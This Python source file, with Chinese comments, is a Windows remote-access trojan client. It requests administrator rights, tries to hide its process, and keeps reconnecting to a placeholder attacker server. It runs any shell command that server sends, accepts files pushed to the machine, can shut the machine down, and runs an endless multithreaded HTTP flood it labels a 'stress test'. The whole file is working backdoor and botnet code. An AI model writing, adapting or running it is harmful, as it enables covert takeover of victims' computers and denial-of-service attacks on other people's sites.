import socket
import subprocess
import os
import sys
import threading
import requests
import ctypes
import time

def run_command(command):
    if command.startswith("stress_test"):
        url = command.split(" ")[1]
        stress_test(url)
        return "Stress test started"
    elif command == "shutdown":
        os.system("shutdown /s /t 1")
        return "Shutting down"
    else:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr

def stress_test(url):
    def request_thread(url):
        while True:
            try:
                response = requests.get(url)
                print(f"Response status: {response.status_code}")
            except:
                print("Request failed")

    num_threads = 10
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=request_thread, args=(url,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)

def hide_process():
    pid = os.getpid()
    kernel32 = ctypes.windll.kernel32
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_SET_INFORMATION = 0x0200
    process_handle = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_SET_INFORMATION, False, pid)
    if process_handle:
        kernel32.SetProcessWorkingSetSizeEx(process_handle, -1, -1, 0x1)
        kernel32.CloseHandle(process_handle)

def receive_file(client_socket, file_name, file_size):
    with open(file_name, 'wb') as file:
        remaining_bytes = file_size
        while remaining_bytes > 0:
            file_data = client_socket.recv(4096)
            file.write(file_data)
            remaining_bytes -= len(file_data)
    print(f"文件 {file_name} 已接收")

def connect_to_server():
    host = '服务端IP地址'  # 替换为服务端的IP地址
    port = 12345          # 与服务端相同的端口

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))
    print(f"Connected to server {host}:{port}")

    while True:
        command = client_socket.recv(1024).decode()
        if not command:
            break

        if command.startswith("send_file"):
            _, file_name, file_size = command.split(" ")
            file_size = int(file_size)
            receive_file(client_socket, file_name, file_size)
        else:
            response = run_command(command)
            client_socket.send(response.encode())
    client_socket.close()

def main():
    run_as_admin()
    hide_process()

    while True:
        try:
            connect_to_server()
        except:
            time.sleep(5)  # 如果连接失败，等待5秒后重新连接

if __name__ == "__main__":
    main()
